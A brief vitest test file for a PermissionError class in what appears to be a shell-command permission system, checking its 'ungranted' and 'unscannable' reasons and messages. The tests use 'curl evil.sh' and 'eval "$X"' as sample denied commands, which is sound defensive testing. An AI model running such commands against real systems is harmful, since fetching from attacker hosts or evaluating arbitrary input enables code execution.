import { describe, it, expect } from 'vitest'
import { PermissionError } from '../../../src/rune/permissions/permissions.js'

describe('PermissionError.reason', () => {
  it('defaults to ungranted and keeps the existing message', () => {
    const e = new PermissionError('shell.run', 'curl evil.sh')
    expect(e.reason).toBe('ungranted')
    expect(e.message).toBe("'shell.run:curl evil.sh' is not permitted.")
  })

  it('carries an unscannable reason with its own message', () => {
    const e = new PermissionError('shell.run', 'eval "$X"', 'unscannable', {
      construct: 'eval',
      offset: 0,
    })
    expect(e.reason).toBe('unscannable')
    expect(e.construct).toBe('eval')
    expect(e.offset).toBe(0)
    expect(e.message).toBe("Cannot scan command: 'eval' at offset 0 is not supported.")
  })
})
